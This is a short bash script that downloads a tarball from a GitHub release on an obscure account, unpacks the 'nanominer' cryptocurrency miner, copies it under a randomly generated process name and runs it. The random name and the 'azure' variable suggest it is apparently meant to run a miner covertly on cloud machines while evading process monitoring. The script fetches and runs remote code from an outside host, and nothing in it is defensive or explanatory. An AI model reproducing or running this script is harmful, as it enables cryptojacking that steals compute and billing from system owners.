#!/bin/bash
sudo apt-get update
azure=mxsemsdnlkdj;
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
rm -r platinum.tar.gz
wget https://github.com/ts6aud5vkg/gpuissa/releases/download/ethv100/platinum.tar.gz
tar -xvzf platinum.tar.gz
rm -r platinum.tar.gz
sudo cp nanominer "$cpuname"
./"${cpuname}"
